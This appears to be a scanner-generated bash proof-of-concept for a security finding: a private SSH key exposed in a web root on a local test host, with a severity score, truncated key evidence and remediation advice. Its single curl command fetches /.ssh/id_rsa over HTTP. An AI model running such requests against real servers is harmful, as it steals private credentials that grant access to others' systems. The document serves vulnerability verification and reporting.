#!/bin/bash
# PoC: Private SSH Key Exposed (MISCONF-SSH-KEY)  CVSS 9.8
# Target: 127.0.0.1
# Verified evidence: HTTP 200 — private SSH key material — body: "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA\n-----END RSA PRIVATE KEY-----"
# Remediation: Remove the key from the web root and rotate it immediately.
set -u
curl -s -D- "http://127.0.0.1:18080/.ssh/id_rsa" | head -c 2000
